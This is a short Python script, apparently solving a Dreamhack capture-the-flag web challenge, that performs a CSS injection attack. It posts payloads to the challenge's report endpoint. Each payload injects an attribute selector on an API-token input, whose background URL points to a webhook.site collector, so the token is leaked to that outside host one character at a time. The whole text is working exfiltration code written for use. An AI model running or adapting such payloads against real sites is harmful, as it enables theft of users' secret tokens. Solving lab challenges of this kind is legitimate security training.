import requests
import string


URL = "http://host3.dreamhack.games:20835/"
WEB_HOOK = "https://webhook.site/2c81e0c0-3405-4989-bd8b-f5d17f619674"

data = {"path":""}

payload = "/mypage?color=red;} input%23InputApitoken[value^="
payload2 = "] {background: url(https://webhook.site/2c81e0c0-3405-4989-bd8b-f5d17f619674)"
for c in string.ascii_letters:
	import time
	value = "sfitbmtesdsodwfj"+c
	print(len(value))
	print(f"value: {value}")
	data['path'] = payload + value + payload2
	requests.post(URL+"report", data)
	
